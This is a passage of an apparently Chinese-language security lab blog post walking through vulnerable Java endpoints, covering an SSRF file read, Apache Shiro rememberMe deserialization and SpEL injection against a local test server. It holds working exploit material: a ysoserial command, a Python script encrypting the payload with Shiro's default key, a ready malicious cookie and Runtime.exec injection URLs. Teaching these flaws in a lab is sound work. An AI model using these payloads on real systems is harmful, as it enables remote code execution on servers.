class="hljs-keyword">while</span> ((inputLine = in.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            html.append(inputLine);<br>        &#125;<br>        in.close();<br>        <span class="hljs-keyword">return</span> html.toString();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.getMessage());<br>        <span class="hljs-keyword">return</span> e.getMessage();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/ssrf/urlConnection/vuln</span>?url=file:<span class="hljs-string">/D</span>:<span class="hljs-string">/1.txt</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941099.png" alt="20250726112949883"></p><h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(value = &quot;/shiro/deserialize&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">shiro_deserialize</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse res)</span> &#123;<br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(req, Constants.REMEMBER_ME_COOKIE);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe);<br>        <span class="hljs-type">byte</span>[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(aesDecrypt);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytes);<br>        in.readObject();<br>        in.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        <span class="hljs-keyword">if</span> (CookieUtils.addCookie(res, <span class="hljs-string">&quot;rememberMe&quot;</span>, DELETE_ME))&#123;<br>            log.error(e.getMessage());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;RememberMe cookie decrypt error. Set deleteMe cookie success.&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Shiro deserialize&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Shiro  <code>rememberMe</code> 功能用于“记住登录状态”。它的设计逻辑是：</p><p>用户勾选“记住我”登录后，Shiro 把用户的认证信息<strong>序列化为字节流</strong>，用一个固定密钥（默认是 <code>kPH+bIxk5D2deZiIxcaaaA==</code>）用 AES 加密，Base64 编码后作为 <code>rememberMe</code> Cookie 发送给浏览器。当浏览器下次请求时，Shiro：读取 <code>rememberMe</code> Cookie，用同样的密钥进行解密，然后<strong>直接反序列化</strong>出用户对象，只要攻击者能控制 <code>rememberMe</code> Cookie 内容，<strong>就能构造恶意对象反序列化，从而执行任意代码。</strong></p><p><strong>漏洞利用：</strong></p><p>生成恶意序列化数据</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial.<span class="hljs-keyword">jar </span>CommonsBeanutils1 <span class="hljs-string">&quot;calc.exe&quot;</span> &gt; payload.<span class="hljs-keyword">bin</span><br></code></pre></td></tr></table></figure><p>加密 Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Shiro 默认密钥</span><br>key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br><br><span class="hljs-comment"># 读取 payload</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\\CTF-Tools\\ysoserial-master\\target\\payload.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    payload = f.read()<br><br><span class="hljs-comment"># 补齐为 16 的倍数 (PKCS5Padding)</span><br>pad = <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(payload) % <span class="hljs-number">16</span><br>payload += <span class="hljs-built_in">bytes</span>([pad] * pad)<br><br><span class="hljs-comment"># AES-CBC 加密 (IV 随机生成)</span><br>iv = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span>  <span class="hljs-comment"># 实际攻击需随机 IV</span><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>encrypted = cipher.encrypt(payload)<br><br><span class="hljs-comment"># Base64 编码</span><br>rememberMe = base64.b64encode(iv + encrypted).decode()  <span class="hljs-comment"># Shiro 格式: IV+密文</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;恶意 Cookie:&quot;</span>, rememberMe)<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">恶意 Cookie: <br>AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/g</span>dRfw9LcryTLP6L34t9wsvsXnBU1VSf5hQbAnLNK8U6tmS8mE71BGg5DVxXjdaZ2Sktj6pGhYmrmySrHqvTuDxmZF+EgIA+g0SQMeALpCzmRK4j4Lmn3JQAqEAhglphaTt+<span class="hljs-number">2</span>UB7rzvNBVbUGHx72GSISDEQiCBRjyufA+sziQUFYCP6DjWEjYOtXKTH+AKulse6AvZXu3Tkybnwa8ZPHPDQGT5b<span class="hljs-regexp">/pNB32K+ftJjsycsFSixp29sAnPqWZQ2c8pOTmznkkXlBdQTDTHtPhGTHntexCFgTHGiqALSXXHWSGmhn8WljmLUFsOLSCgEeWFPZt5uWX78goP5ZDwU/</span>ZYGm5QyIgBBYjjYyuv6nYVZKYbH1A22Iy5sKFjbFXY3YyXWV3hLgmI801jgthjOt5G3iKXhUK557xmEXqe9gZamYVPMxKdIRdiU7fQMPH<span class="hljs-regexp">/7sVd8zAorKWwpoCxU9AedfAZbDFN0I3/g</span>cYI0dAbQg9GyC9jMb5OiDIZE6sFd2XTSWbYQrdnePZe5gPjx8zlntQYl+<span class="hljs-number">7</span>imK4pCFGgBIqX+<span class="hljs-number">1</span>G0O0GvRIBoWUadk5KK8lm9J3aXjtfo25hFu6DnnPnDyRQnudEdQLjNqYpiIxJtNw<span class="hljs-regexp">/W0VgEmjpG2OsLRtsCRddr8/</span>Vky+<span class="hljs-number">6</span>t5i76oEqDU8iPh<span class="hljs-regexp">/Stjj9OfjfSNroe3B5Nbzzh1e0KWVoTPoNRc4d3THTBcaNeK3YnyTN3Ws+88WBG7vbFZF9Fj5GdksjEYcmRDnWbukoLJJH0diWwXT7cSKOdKqAsFQr0meXhGWvMAN1EP74/</span>zvbXM<span class="hljs-regexp">/RpZZlefSQpfeh29D2wxaqdP2ydMTo+qixxTIIEspf4EFI3/</span>vO+kPojn<span class="hljs-regexp">/GA+H38ovGW6reqxHXooV655jmV155px5BFR/</span>MvklhgGyiSPVNoPL567alnOsfhd2R2h3<span class="hljs-regexp">/6VZv04uwu4p4dLa13EL9l+PEOXETpbLQEYmln707qD3+mx+lUD8HHusPJfVtI6CZPzceIdq/</span>c347uFpGmvZv0fzulV2NuWKS2N5rsBmuUR<span class="hljs-regexp">/+RZR9Pdu65/</span>KYqX85Fw1knJYNJF3wKT<span class="hljs-regexp">/uI8deF+D0b/</span>Ib0rzkHWI2nFWQ24T+Zl1<span class="hljs-regexp">/DsEleOAe8KQaS6mfcbfHyyilY0tFL3dw2TmcFqToSoFeuJEGsAiRjM+1bp5TqJmfKUcnbDqLK4ybs+IlUh1ESSTFBiE7soFo9vytcu1l1Q4YL3OwbTLci2CpaugEF6ehkJrQ0a2JlTDScqxVGtkkT13p9+b5XShyLT83rSoVbQWfQuaWw0EIfaz295IzGjmo8F46mo2EJIB0HXbSiRusBU7x4xLgpjvZ5G8c7GkQNOfx96gGHYy6k+yoWcSKWWuKq7SVqgI8bKSDrGT25Ko8dPGpTYjQ5YyVw3PA2AU8VqdaUMWINPNMm5Aoi/</span>AgzKBPup2b+<span class="hljs-number">3</span>V618KprP6u029vuQoW9VysdJCsmA3MyCqQFvCGpaK0KbKWo+<span class="hljs-number">8</span>ZGYqH4sPJH4xJe1SlocC+hJpR+o+AHmD1S7cESYzXXQMMThHbcP2XD84AUvHWCE2N4R8CJBWKn6WlXPQDgQPjt7EQIQVZFExgSY8M<span class="hljs-regexp">/D0o9vQYfxibUt+7RgHQ+4QrZvqxkR9YcdXldx+Fvhjwz/</span>fgg<span class="hljs-regexp">/rktKZf6KChS7vLrZSoIOLeO6a1BVVp9TQKHix1wTs5rTiQyNEBL2q1ZpCIoEbEhRFHeynOgtTjzuUrYZkSZQJ7Llrd8MvejJqCZW9ooOP38g5jmK8tZMX1+G5N/</span>o2X0cKdGWLrUx5SArOLo5tf7LnUF716la<span class="hljs-regexp">/EnO/</span>sgvPAq2URt0umwmnldywDMZl0ZQVQwHySRrl+qbJEnSrdQAppjPtHI4lnW9+SrqIqPbcUieH6yWi0HRrQQXgUUSMgEO2LR<span class="hljs-regexp">/p9cbqG+ouAeLL2RVCUyscWdpbT2k1Ffjpxq98yp7iu0SQScOAmB6eLUBJueow1p+Jl1L5xakot4cpS5TNEiyzGVdNTVr/</span>M9SFzyQTARtW4HdKZoVU2VUMIZUScaudUl+Jjvwi<span class="hljs-regexp">/0haRw/</span>emevd<span class="hljs-regexp">/wjsxM0y7EWaLyjn0NjgXiLpGkEh433iyTBF+0U3j87DAYmA2KKWHsr2aXryYCjJHhKCHXCTq3sEn5OwshulkaeVZaxiCkFx0NeLa37v66DnyctyjVTTIV9nMhKLC62UVFzwkppxwt2RQAgo/</span>YvJHZrhV4SPFgZQMt07yvTCGOhRsWYev+IwidIHrcefeYPDuWTXsO9LAZu9dUTu7R5pM7u7oKbBPpXYuqiCVOm5HQOUPbS<span class="hljs-regexp">/kmBxGFZcEQhP+hI0SliS7+D0Az3YfLHX59AFfRwAN/</span>R1RXkscsUxZ5FT43IcXEFoEsC1rIK46TJWiZErGsPGLphxXsLVrAu<span class="hljs-regexp">/1IlrSbwLp/</span>lUFtJLzmN9LemI2WM1mhn6SiO1QNWX79hSHZjAZTytzSpRXewdcPCmztKIyFZEYLPQlzZ5opck7Vb+<span class="hljs-number">3</span>sxqRYjWucGEnVn8zKdUG<span class="hljs-regexp">/6XG3n1PXReOaXu8ZcK+XcdK57tAwiW2i/</span><span class="hljs-number">4</span>ewrWv6wK3vIZ1S7SecN8Ff7Kg<span class="hljs-regexp">/mNVnAKFNVU/</span><span class="hljs-number">4</span>YgI0hi1tgoou2k89ieMdayFpxQPrsTQHf8TTSsVKzGnU125XYarMHAosNLm9H6dkt09i5Qg72HT<span class="hljs-regexp">/wKq7vkZGOLQ4U9egq3FRsxDL9sq1BayxIqPAVcfjfQ7Ft+e4nYJ0GKANDc8Hv/</span><span class="hljs-number">4</span>ij9qIjJ2rD6f0GUuU0rBS8xFVLenvKPUjneFgDcCtJ2ZmdZJGbH8Wget9lkEYp4ioMR7GSYIJ21bNAX<span class="hljs-regexp">/3imJ21yF2Qt74Gamc1972lYhOEtVWQeYwsW5AsDYIr9hVNysJvlXS6Wq2ear/</span>vv0wALrp8De4IIuAhTxVUj4B2a8i7TcY1wl2UmPMfjnzEpKIQZAeJ96ESqYQSCNhH11NNdL6+Zg9kGqy2Q<span class="hljs-regexp">/bW/</span><span class="hljs-number">1</span>nlTjg+dVs7bd8hq7ZEWo9qFNpCUg9ulN27sZA+nP6tlQYLioDJQtv0uos7EHkLrY63BAwE3yabrxn3RkLnk8arqkedmOag46+vydoiyqzDvka5HuZN7ntLTcggMo4lfG0MhTQji21qbky7zEZxeWty55t<span class="hljs-regexp">/UhCCLVQQsBQcu4v3M6eNe9maR985c1Nw7opVGKb9p1MAm7OCOq4Hkl4rwyWjroSXEaJpjQCdAiikTrMsIj2YDr5kIN79WEITTbBB6iMEimvXpqcy1nqqnNN3D4yKlf2zmwKpyvDYCoz71RCO+1P9O8Js3RftXHrHew2X/</span>Y<span class="hljs-regexp">/2sGrn8YuxthTUBLhA7aF6+jMzVzBhmRygBcrx5E3zkOPIyDwP9jheD9ghHEBvCJE5Se3kXmcY0dsOVZWp1yCSQShAZL0dfCCCcLzG1V/y</span>dV1Y3q8Jt5Q2KslxZkyF5gR94O3<span class="hljs-regexp">/46aqAXSCxyoxT3Sh/</span>SFZ+wEOcI<span class="hljs-regexp">/XOqGrg9J82FnTBCvVOOvtV3mF0KC/</span>p3TD8ARmpy1xE+<span class="hljs-number">1</span>kt9C+CjYL+QAS<span class="hljs-regexp">/G/</span>AppCDhNKAhH6K4gOnSv7XkvbGmw0L5lXj0jxLItOL13xZ6zU0dcDR8LwybZnZadALqTLpFHaBdDEms2QtRn8sIiXvvWqPZvKdbgw3MRcVtA==<br></code></pre></td></tr></table></figure><p>发送 cookie 请求</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">Cookie: <br>rememberMe=AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/g</span>dRfw9LcryTLP6L34t9wsvsXnBU1VSf5hQbAnLNK8U6tmS8mE71BGg5DVxXjdaZ2Sktj6pGhYmrmySrHqvTuDxmZF+EgIA+g0SQMeALpCzmRK4j4Lmn3JQAqEAhglphaTt+<span class="hljs-number">2</span>UB7rzvNBVbUGHx72GSISDEQiCBRjyufA+sziQUFYCP6DjWEjYOtXKTH+AKulse6AvZXu3Tkybnwa8ZPHPDQGT5b<span class="hljs-regexp">/pNB32K+ftJjsycsFSixp29sAnPqWZQ2c8pOTmznkkXlBdQTDTHtPhGTHntexCFgTHGiqALSXXHWSGmhn8WljmLUFsOLSCgEeWFPZt5uWX78goP5ZDwU/</span>ZYGm5QyIgBBYjjYyuv6nYVZKYbH1A22Iy5sKFjbFXY3YyXWV3hLgmI801jgthjOt5G3iKXhUK557xmEXqe9gZamYVPMxKdIRdiU7fQMPH<span class="hljs-regexp">/7sVd8zAorKWwpoCxU9AedfAZbDFN0I3/g</span>cYI0dAbQg9GyC9jMb5OiDIZE6sFd2XTSWbYQrdnePZe5gPjx8zlntQYl+<span class="hljs-number">7</span>imK4pCFGgBIqX+<span class="hljs-number">1</span>G0O0GvRIBoWUadk5KK8lm9J3aXjtfo25hFu6DnnPnDyRQnudEdQLjNqYpiIxJtNw<span class="hljs-regexp">/W0VgEmjpG2OsLRtsCRddr8/</span>Vky+<span class="hljs-number">6</span>t5i76oEqDU8iPh<span class="hljs-regexp">/Stjj9OfjfSNroe3B5Nbzzh1e0KWVoTPoNRc4d3THTBcaNeK3YnyTN3Ws+88WBG7vbFZF9Fj5GdksjEYcmRDnWbukoLJJH0diWwXT7cSKOdKqAsFQr0meXhGWvMAN1EP74/</span>zvbXM<span class="hljs-regexp">/RpZZlefSQpfeh29D2wxaqdP2ydMTo+qixxTIIEspf4EFI3/</span>vO+kPojn<span class="hljs-regexp">/GA+H38ovGW6reqxHXooV655jmV155px5BFR/</span>MvklhgGyiSPVNoPL567alnOsfhd2R2h3<span class="hljs-regexp">/6VZv04uwu4p4dLa13EL9l+PEOXETpbLQEYmln707qD3+mx+lUD8HHusPJfVtI6CZPzceIdq/</span>c347uFpGmvZv0fzulV2NuWKS2N5rsBmuUR<span class="hljs-regexp">/+RZR9Pdu65/</span>KYqX85Fw1knJYNJF3wKT<span class="hljs-regexp">/uI8deF+D0b/</span>Ib0rzkHWI2nFWQ24T+Zl1<span class="hljs-regexp">/DsEleOAe8KQaS6mfcbfHyyilY0tFL3dw2TmcFqToSoFeuJEGsAiRjM+1bp5TqJmfKUcnbDqLK4ybs+IlUh1ESSTFBiE7soFo9vytcu1l1Q4YL3OwbTLci2CpaugEF6ehkJrQ0a2JlTDScqxVGtkkT13p9+b5XShyLT83rSoVbQWfQuaWw0EIfaz295IzGjmo8F46mo2EJIB0HXbSiRusBU7x4xLgpjvZ5G8c7GkQNOfx96gGHYy6k+yoWcSKWWuKq7SVqgI8bKSDrGT25Ko8dPGpTYjQ5YyVw3PA2AU8VqdaUMWINPNMm5Aoi/</span>AgzKBPup2b+<span class="hljs-number">3</span>V618KprP6u029vuQoW9VysdJCsmA3MyCqQFvCGpaK0KbKWo+<span class="hljs-number">8</span>ZGYqH4sPJH4xJe1SlocC+hJpR+o+AHmD1S7cESYzXXQMMThHbcP2XD84AUvHWCE2N4R8CJBWKn6WlXPQDgQPjt7EQIQVZFExgSY8M<span class="hljs-regexp">/D0o9vQYfxibUt+7RgHQ+4QrZvqxkR9YcdXldx+Fvhjwz/</span>fgg<span class="hljs-regexp">/rktKZf6KChS7vLrZSoIOLeO6a1BVVp9TQKHix1wTs5rTiQyNEBL2q1ZpCIoEbEhRFHeynOgtTjzuUrYZkSZQJ7Llrd8MvejJqCZW9ooOP38g5jmK8tZMX1+G5N/</span>o2X0cKdGWLrUx5SArOLo5tf7LnUF716la<span class="hljs-regexp">/EnO/</span>sgvPAq2URt0umwmnldywDMZl0ZQVQwHySRrl+qbJEnSrdQAppjPtHI4lnW9+SrqIqPbcUieH6yWi0HRrQQXgUUSMgEO2LR<span class="hljs-regexp">/p9cbqG+ouAeLL2RVCUyscWdpbT2k1Ffjpxq98yp7iu0SQScOAmB6eLUBJueow1p+Jl1L5xakot4cpS5TNEiyzGVdNTVr/</span>M9SFzyQTARtW4HdKZoVU2VUMIZUScaudUl+Jjvwi<span class="hljs-regexp">/0haRw/</span>emevd<span class="hljs-regexp">/wjsxM0y7EWaLyjn0NjgXiLpGkEh433iyTBF+0U3j87DAYmA2KKWHsr2aXryYCjJHhKCHXCTq3sEn5OwshulkaeVZaxiCkFx0NeLa37v66DnyctyjVTTIV9nMhKLC62UVFzwkppxwt2RQAgo/</span>YvJHZrhV4SPFgZQMt07yvTCGOhRsWYev+IwidIHrcefeYPDuWTXsO9LAZu9dUTu7R5pM7u7oKbBPpXYuqiCVOm5HQOUPbS<span class="hljs-regexp">/kmBxGFZcEQhP+hI0SliS7+D0Az3YfLHX59AFfRwAN/</span>R1RXkscsUxZ5FT43IcXEFoEsC1rIK46TJWiZErGsPGLphxXsLVrAu<span class="hljs-regexp">/1IlrSbwLp/</span>lUFtJLzmN9LemI2WM1mhn6SiO1QNWX79hSHZjAZTytzSpRXewdcPCmztKIyFZEYLPQlzZ5opck7Vb+<span class="hljs-number">3</span>sxqRYjWucGEnVn8zKdUG<span class="hljs-regexp">/6XG3n1PXReOaXu8ZcK+XcdK57tAwiW2i/</span><span class="hljs-number">4</span>ewrWv6wK3vIZ1S7SecN8Ff7Kg<span class="hljs-regexp">/mNVnAKFNVU/</span><span class="hljs-number">4</span>YgI0hi1tgoou2k89ieMdayFpxQPrsTQHf8TTSsVKzGnU125XYarMHAosNLm9H6dkt09i5Qg72HT<span class="hljs-regexp">/wKq7vkZGOLQ4U9egq3FRsxDL9sq1BayxIqPAVcfjfQ7Ft+e4nYJ0GKANDc8Hv/</span><span class="hljs-number">4</span>ij9qIjJ2rD6f0GUuU0rBS8xFVLenvKPUjneFgDcCtJ2ZmdZJGbH8Wget9lkEYp4ioMR7GSYIJ21bNAX<span class="hljs-regexp">/3imJ21yF2Qt74Gamc1972lYhOEtVWQeYwsW5AsDYIr9hVNysJvlXS6Wq2ear/</span>vv0wALrp8De4IIuAhTxVUj4B2a8i7TcY1wl2UmPMfjnzEpKIQZAeJ96ESqYQSCNhH11NNdL6+Zg9kGqy2Q<span class="hljs-regexp">/bW/</span><span class="hljs-number">1</span>nlTjg+dVs7bd8hq7ZEWo9qFNpCUg9ulN27sZA+nP6tlQYLioDJQtv0uos7EHkLrY63BAwE3yabrxn3RkLnk8arqkedmOag46+vydoiyqzDvka5HuZN7ntLTcggMo4lfG0MhTQji21qbky7zEZxeWty55t<span class="hljs-regexp">/UhCCLVQQsBQcu4v3M6eNe9maR985c1Nw7opVGKb9p1MAm7OCOq4Hkl4rwyWjroSXEaJpjQCdAiikTrMsIj2YDr5kIN79WEITTbBB6iMEimvXpqcy1nqqnNN3D4yKlf2zmwKpyvDYCoz71RCO+1P9O8Js3RftXHrHew2X/</span>Y<span class="hljs-regexp">/2sGrn8YuxthTUBLhA7aF6+jMzVzBhmRygBcrx5E3zkOPIyDwP9jheD9ghHEBvCJE5Se3kXmcY0dsOVZWp1yCSQShAZL0dfCCCcLzG1V/y</span>dV1Y3q8Jt5Q2KslxZkyF5gR94O3<span class="hljs-regexp">/46aqAXSCxyoxT3Sh/</span>SFZ+wEOcI<span class="hljs-regexp">/XOqGrg9J82FnTBCvVOOvtV3mF0KC/</span>p3TD8ARmpy1xE+<span class="hljs-number">1</span>kt9C+CjYL+QAS<span class="hljs-regexp">/G/</span>AppCDhNKAhH6K4gOnSv7XkvbGmw0L5lXj0jxLItOL13xZ6zU0dcDR8LwybZnZadALqTLpFHaBdDEms2QtRn8sIiXvvWqPZvKdbgw3MRcVtA==<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942029.png" alt="20250726132755476"></p><p>也可以利用工具：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942947.png" alt="20250726133031514"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942394.png" alt="20250726133042646"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942506.png" alt="20250726133057346"></p><h2 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h2><blockquote><p>Spring Expression Language 是一种表达式语言，支持运行时查询和操作对象图，同时也有方法调用和字符串模板功能</p><p>SpEL使用 <code>#&#123;...&#125;</code> 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：</p><blockquote><p>引用其他对象:<code>#&#123;car&#125;</code><br>引用其他对象的属性：<code>#&#123;car.brand&#125;</code><br>调用其它方法 , 还可以链式操作：<code>#&#123;car.toString()&#125;</code></p></blockquote><p>1.类类型表达式</p><p>使用<code>T()</code>运算符会调用类作用域的静态属性或静态方法，SpEL内置了<code>java.lang</code>包下的类声明，也就是说<code>java.lang.String</code>可以通过<code>T(String)</code>访问，而不需要使用全限定名<br>比如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">T</span><span class="hljs-params">(Runtime)</span></span><span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(\<span class="hljs-string">&quot;open /Applications/Calculator.app\&quot;)</span><br></code></pre></td></tr></table></figure><p>2.类实例化<br>使用new可以直接在SpEL中创建实例，需要创建实例的类要通过全限定名进行访问。<br>比如</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">new</span> java.util.<span class="hljs-built_in">Date</span>()<br></code></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/spel/vuln1&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">spel_vuln1</span><span class="hljs-params">(String value)</span> &#123;<br>    <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-keyword">return</span> parser.parseExpression(value).getValue().toString();<br>&#125;<br><br><br><span class="hljs-meta">@RequestMapping(&quot;spel/vuln2&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">spel_vuln2</span><span class="hljs-params">(String value)</span> &#123;<br>    <span class="hljs-type">StandardEvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>    <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(value, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateParserContext</span>());<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> expression.getValue(context);    <span class="hljs-comment">// trigger vulnerability point</span><br>    <span class="hljs-keyword">return</span> x.toString();   <span class="hljs-comment">// response</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>/spel/vuln1?value=<span class="hljs-built_in">T</span>(java.lang.Runtime).<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br>-&gt; http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>/spel/vuln1?value=<span class="hljs-built_in">T</span>(java.lang.Runtime).<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">exec</span>(%<span class="hljs-number">27</span>calc%<span class="hljs-number">27</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942808.png" alt="20250726134132360"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8081</span>/spel/vuln2?value=$&#123;T(java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br>-&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8081</span>/spel/vuln2?value=<span class="hljs-variable">%2</span>4<span class="hljs-variable">%7BT</span>(java.lang.Runtime.getRuntime().exec(<span class="hljs-variable">%2</span>7calc<span class="hljs-variable">%27</span>)<span class="hljs-variable">%7D</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942479.png" alt="20250726133936240"></p><h2 id="URLRedirect"><a href="#URLRedirect" class="headerlink" 